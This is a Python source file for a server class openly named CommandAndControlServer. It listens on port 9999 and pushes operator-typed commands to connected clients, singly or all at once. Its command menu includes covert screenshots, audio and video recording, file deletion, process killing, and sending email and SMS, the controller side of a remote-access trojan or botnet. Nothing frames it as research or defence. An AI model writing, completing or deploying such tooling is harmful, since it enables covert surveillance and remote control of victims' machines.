import socket
import threading
import logging

class CommandAndControlServer:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        logging.basicConfig(level=logging.INFO)
        logging.info(f"Server started on {self.host}:{self.port}")
        self.clients = {}  # Dictionary to store connected client sockets
        self.lock = threading.Lock()  # Lock for thread-safe access to clients

    def handle_client(self, client_socket, addr):
        try:
            with self.lock:
                self.clients[addr] = client_socket  # Add client socket to dictionary
            while True:
                command = input("Enter command: ").strip().lower()
                if command == "exit":
                    client_socket.send(command.encode())
                    break
                elif command == "list":
                    self.list_clients()
                elif command == "send":
                    self.send_command(client_socket, addr)
                elif command == "send_all":
                    self.send_command_to_all()
                elif command == "help":
                    self.show_help()
                else:
                    self.process_command(client_socket, command)
        except Exception as e:
            logging.error(f"Error handling client {addr}: {e}")
        finally:
            with self.lock:
                del self.clients[addr]
            client_socket.close()

    def list_clients(self):
        logging.info("Connected clients:")
        with self.lock:
            for addr in self.clients:
                logging.info(addr)

    def send_command(self, client_socket, addr):
        command = input("Enter command to send: ")
        client_socket.send(command.encode())

    def send_command_to_all(self):
        command = input("Enter command to send to all clients: ")
        with self.lock:
            for client_socket in self.clients.values():
                client_socket.send(command.encode())

    def process_command(self, client_socket, command):
        if command in ["create_folder", "delete_folder", "create_file", "delete_file", "copy_file", "move_file", "connect_wifi", "ping", "start_process", "stop_process", "kill_process", "list_processes", "open_app", "screenshot", "record_audio", "record_video", "play_audio", "play_video", "send_email", "send_sms"]:
            param = input(f"Enter parameter for {command}: ")
            client_socket.send(command.encode())
            client_socket.send(param.encode())
        else:
            logging.warning(f"Unknown command: {command}")
            client_socket.send(command.encode())

    def show_help(self):
        commands = [
            "create_folder", "delete_folder", "create_file", "delete_file", "copy_file", "move_file",
            "connect_wifi", "ping", "start_process", "stop_process", "kill_process", "list_processes",
            "open_app", "screenshot", "record_audio", "record_video", "play_audio", "play_video",
            "send_email", "send_sms", "list", "send", "send_all", "help", "restart", "system_info", "exit"
        ]
        logging.info("Available commands:")
        for command in commands:
            logging.info(command)

    def start(self):
        while True:
            client_socket, addr = self.server.accept()
            logging.info(f"New connection from {addr}")
            client_handler = threading.Thread(target=self.handle_client, args=(client_socket, addr))
            client_handler.start()

if __name__ == "__main__":
    server = CommandAndControlServer("0.0.0.0", 9999)
    server.start()
